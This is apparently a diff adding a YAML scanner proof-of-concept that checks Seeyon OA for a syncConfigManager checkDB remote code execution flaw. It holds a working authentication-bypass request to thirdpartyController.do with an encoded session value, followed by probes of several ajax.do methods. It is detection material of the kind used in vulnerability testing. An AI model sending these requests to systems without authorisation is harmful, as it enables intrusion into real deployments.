@@ -1,0 +1,45 @@
+name: poc-yaml-seeyon-oa-syncconfigManager-checkdb-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/thirdpartyController.do
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+        expression: response.status == 200 && response.body.bcontains(bytes("/seeyon/common/images"))
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/ajax.do
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: method=ajaxAction&managerName=syncConfigManager&managerMethod=checkDB&arguments=[""]
+            follow_redirects: false
+        expression: response.body_string.contains("\"message\":\"can not find the method [checkDB], which has 1 arguments.\",\"code\":")
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/ajax.do
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: method=ajaxAction&managerName=syncConfigManager&managerMethod=checkIsCreate&arguments=[""]
+            follow_redirects: false
+        expression: response.body_string.contains("\"message\":\"can not find the method [checkIsCreate], which has 1 arguments.\",\"code\":")
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/ajax.do
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: method=ajaxAction&managerName=syncConfigManager&managerMethod=createTableOrView&arguments=[""]
+            follow_redirects: false
+        expression: response.body_string.contains("\"message\":\"can not find the method [createTableOrView], which has 1 arguments.\",\"code\":")
+expression: r0() && (r1() || r2() || r3())
+detail: {}
